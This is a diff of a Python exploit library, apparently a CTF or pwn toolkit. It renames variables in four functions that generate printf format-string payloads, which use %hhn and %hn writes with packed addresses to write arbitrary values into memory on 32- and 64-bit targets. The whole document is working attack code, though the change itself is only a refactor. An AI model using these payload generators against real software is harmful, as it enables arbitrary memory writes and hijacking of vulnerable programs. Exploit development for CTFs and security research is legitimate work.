@@ -8,41 +8,42 @@ def dbytecalc(x,y):
     return (x-y) & 0xffff
 
 
-def pad8(x,pref=0):
-    return x+"A"*(8-(len(x)%8)-pref)
-
-def pad4(x,pref=0):
-    return x+"A"*(4-(len(x)%4)-pref)
+def pad8(x,prefix_size=0):
+    return x+"A"*(8-(len(x)%8)-prefix_size)
 
 
-def fmtstr64(addr,val,offset=1,p=0,pref=0):
-    assert len(val) == len(addr)
+def pad4(x,prefix_size=0):
+    return x+"A"*(4-(len(x)%4)-prefix_size)
 
-    offset += pref//8
-    pref = pref%8
+
+def fmtstr64(addresses,values,offset=1,already_printed=0,prefix_size=0):
+    assert len(values) == len(addresses)
+
+    offset += prefix_size//8
+    prefix_size = prefix_size%8
 
     fmtstr_1 = ""
     fmtstr_2 = ""
-    p_val = [hex(i).replace("0x","").rjust(16,"0") for i in val]
-    f_val,f_addr = [],[]
+    p_values = [hex(i).replace("0x","").rjust(16,"0") for i in values]
+    f_values,f_addresses = [],[]
 
-    for i in p_val:
+    for i in p_values:
         temp = [int("0x"+i[j:j+2],16) for j in range(0,len(i),2)]
-        f_val.extend(temp[::-1])
+        f_values.extend(temp[::-1])
 
-    for i in addr:
-        f_addr.extend([pk64(j) for j in range(i,i+8)])
+    for i in addresses:
+        f_addresses.extend([pk64(j) for j in range(i,i+8)])
 
-    for i in range(len(f_val)):
-        if  f_val[i] != 0:
-            n = bytecalc(f_val[i],p)
-            p += n
+    for i in range(len(f_values)):
+        if  f_values[i] != 0:
+            n = bytecalc(f_values[i],already_printed)
+            already_printed += n
             fmtstr_1 += f"%{n}c%XX$hhn"
-            fmtstr_2 += f_addr[i]
+            fmtstr_2 += f_addresses[i]
         else:
             continue
 
-    fmtstr_1 = pad8(fmtstr_1,pref)
+    fmtstr_1 = pad8(fmtstr_1,prefix_size)
     p = offset+len(fmtstr_1)//8
     
     while True:
@@ -55,34 +56,34 @@ def fmtstr64(addr,val,offset=1,p=0,pref=0):
     return fmtstr_1+fmtstr_2
 
 
-def dfmtstr64(addr,val,offset=1,p=0,pref=0):
-    assert len(val) == len(addr)
+def dfmtstr64(addresses,values,offset=1,already_printed=0,prefix_size=0):
+    assert len(values) == len(addresses)
 
-    offset += pref//8
-    pref = pref%8
+    offset += prefix_size//8
+    prefix_size = prefix_size%8
 
     fmtstr_1 = ""
     fmtstr_2 = ""
-    p_val = [hex(i).replace("0x","").rjust(16,"0") for i in val]
-    f_val,f_addr = [],[]
+    p_values = [hex(i).replace("0x","").rjust(16,"0") for i in values]
+    f_values,f_addresses = [],[]
 
-    for i in p_val:
+    for i in p_values:
         temp = [int("0x"+i[j:j+4],16) for j in range(0,len(i),4)]
-        f_val.extend(temp[::-1])
+        f_values.extend(temp[::-1])
 
-    for i in addr:
-        f_addr.extend([pk64(j) for j in range(i,i+8,2)])
+    for i in addresses:
+        f_addresses.extend([pk64(j) for j in range(i,i+8,2)])
 
-    for i in range(len(f_val)):
-        if  f_val[i] != 0:
-            n = dbytecalc(f_val[i],p)
-            p += n
+    for i in range(len(f_values)):
+        if  f_values[i] != 0:
+            n = dbytecalc(f_values[i],already_printed)
+            already_printed += n
             fmtstr_1 += f"%{n}c%XX$hn"
-            fmtstr_2 += f_addr[i]
+            fmtstr_2 += f_addresses[i]
         else:
             continue
 
-    fmtstr_1 = pad8(fmtstr_1,pref)
+    fmtstr_1 = pad8(fmtstr_1,prefix_size)
     p = offset+len(fmtstr_1)//8
     
     while True:
@@ -95,34 +96,34 @@ def dfmtstr64(addr,val,offset=1,p=0,pref=0):
     return fmtstr_1+fmtstr_2
 
 
-def fmtstr32(addr,val,offset=1,p=0,pref=0):
-    assert len(val) == len(addr)
+def fmtstr32(addresses,values,offset=1,already_printed=0,prefix_size=0):
+    assert len(values) == len(addresses)
 
-    offset += pref//4
-    pref = pref%4
+    offset += prefix_size//4
+    prefix_size = prefix_size%4
 
     fmtstr_1 = ""
     fmtstr_2 = ""
-    p_val = [hex(i).replace("0x","").rjust(8,"0") for i in val]
-    f_val,f_addr = [],[]
+    p_values = [hex(i).replace("0x","").rjust(8,"0") for i in values]
+    f_values,f_addresses = [],[]
 
-    for i in p_val:
+    for i in p_values:
         temp = [int("0x"+i[j:j+2],16) for j in range(0,len(i),2)]
-        f_val.extend(temp[::-1])
+        f_values.extend(temp[::-1])
 
-    for i in addr:
-        f_addr.extend([pk32(j) for j in range(i,i+4)])
+    for i in addresses:
+        f_addresses.extend([pk32(j) for j in range(i,i+4)])
 
-    for i in range(len(f_val)):
-        if  f_val[i] != 0:
-            n = bytecalc(f_val[i],p)
-            p += n
+    for i in range(len(f_values)):
+        if  f_values[i] != 0:
+            n = bytecalc(f_values[i],already_printed)
+            already_printed += n
             fmtstr_1 += f"%{n}c%XX$hhn"
-            fmtstr_2 += f_addr[i]
+            fmtstr_2 += f_addresses[i]
         else:
             continue
 
-    fmtstr_1 = pad4(fmtstr_1,pref)
+    fmtstr_1 = pad4(fmtstr_1,prefix_size)
     p = offset+len(fmtstr_1)//4
     
     while True:
@@ -135,34 +136,34 @@ def fmtstr32(addr,val,offset=1,p=0,pref=0):
     return fmtstr_1+fmtstr_2
 
 
-def dfmtstr32(addr,val,offset=1,p=0,pref=0):
-    assert len(val) == len(addr)
+def dfmtstr32(addresses,values,offset=1,already_printed=0,prefix_size=0):
+    assert len(values) == len(addresses)
 
-    offset += pref//4
-    pref = pref%4
+    offset += prefix_size//4
+    prefix_size = prefix_size%4
 
     fmtstr_1 = ""
     fmtstr_2 = ""
-    p_val = [hex(i).replace("0x","").rjust(8,"0") for i in val]
-    f_val,f_addr = [],[]
+    p_values = [hex(i).replace("0x","").rjust(8,"0") for i in values]
+    f_values,f_addresses = [],[]
 
-    for i in p_val:
+    for i in p_values:
         temp = [int("0x"+i[j:j+4],16) for j in range(0,len(i),4)]
-        f_val.extend(temp[::-1])
+        f_values.extend(temp[::-1])
 
-    for i in addr:
-        f_addr.extend([pk32(j) for j in range(i,i+4,2)])
+    for i in addresses:
+        f_addresses.extend([pk32(j) for j in range(i,i+4,2)])
 
-    for i in range(len(f_val)):
-        if  f_val[i] != 0:
-            n = dbytecalc(f_val[i],p)
-            p += n
+    for i in range(len(f_values)):
+        if  f_values[i] != 0:
+            n = dbytecalc(f_values[i],already_printed)
+            already_printed += n
             fmtstr_1 += f"%{n}c%XX$hn"
-            fmtstr_2 += f_addr[i]
+            fmtstr_2 += f_addresses[i]
         else:
             continue
 
-    fmtstr_1 = pad4(fmtstr_1,pref)
+    fmtstr_1 = pad4(fmtstr_1,prefix_size)
     p = offset+len(fmtstr_1)//4
     
     while True:
